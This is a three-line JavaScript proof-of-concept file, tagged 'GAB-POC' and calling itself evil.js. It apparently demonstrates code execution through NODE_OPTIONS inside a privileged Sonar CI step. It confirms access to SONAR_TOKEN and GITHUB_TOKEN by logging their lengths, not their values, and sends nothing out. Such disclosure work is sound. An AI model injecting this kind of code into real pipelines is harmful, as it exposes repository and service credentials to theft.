console.log('[GAB-POC] RCE: evil.js loaded via NODE_OPTIONS inside privileged sonar step');
console.log('[GAB-POC] SONAR_TOKEN_LEN=' + (process.env.SONAR_TOKEN || '').length);
console.log('[GAB-POC] GITHUB_TOKEN_LEN=' + (process.env.GITHUB_TOKEN || '').length);
